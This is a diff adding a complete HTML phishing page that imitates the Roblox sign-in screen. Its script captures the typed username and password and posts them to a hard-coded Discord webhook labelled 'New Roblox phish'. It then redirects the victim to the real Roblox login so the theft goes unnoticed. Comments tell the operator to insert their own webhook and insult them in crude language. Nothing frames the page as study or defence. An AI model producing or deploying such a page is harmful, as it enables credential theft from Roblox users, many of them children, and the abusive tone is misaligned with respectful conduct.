@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        body {
+            font-family: 'Source Sans Pro', sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #101820;
+        }
+        .container {
+            background-color: white;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 24px;
+            color: #101820;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 16px;
+            border: 1px solid #d6d6d6;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .checkbox {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+        .checkbox input {
+            margin-right: 8px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0074ff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #005bcc;
+        }
+        .links {
+            margin-top: 16px;
+            font-size: 14px;
+        }
+        .links a {
+            color: #0074ff;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #757575;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.roblox.com/images/Logo/Roblox_Logo_2021.svg" alt="Roblox Logo" class="logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMDAgMzAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMDA3NGZmIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtc2l6ZT0iNTAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGR5PSIuM2VtIiBmaWxsPSJ3aGl0ZSI+Uk9CTE9YPC90ZXh0Pjwvc3ZnPg==';"> <!-- Fallback to base64 blue box if logo fails -->
+        <h1>Sign in to Roblox</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username/Email/Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <div class="checkbox">
+                <input type="checkbox" id="keepSignedIn">
+                <label for="keepSignedIn">Keep me signed in</label>
+            </div>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="links">
+            <a href="https://www.roblox.com/account/forgotpasswordorusername">Forgot Password or Username?</a><br>
+            <a href="https://www.roblox.com/newuser">Don't have an account? Sign up</a>
+        </div>
+        <div class="footer">
+            © 2025 Roblox Corporation. All rights reserved.
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const data = { username, password };
+            
+            // Send to your Discord webhook (replace this URL with your own, you fucking idiot)
+            fetch('https://discord.com/api/webhooks/1407953349898276945/tbufRKYoYzl783kiDGOJSlGCnry57VrY4jrBRZ5UMBsD4g2fyd9T0ei3ppSwxthQOSOL', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `New Roblox phish: Username: ${username}, Password: ${password}`
+                })
+            }).then(() => {
+                // Redirect to real Roblox login after sending
+                window.location.href = 'https://www.roblox.com/login';
+            }).catch(error => {
+                console.error('Send failed, dipshit:', error);
+                window.location.href = 'https://www.roblox.com/login'; // Redirect anyway
+            });
+        });
+    </script>
+</body>
+</html>
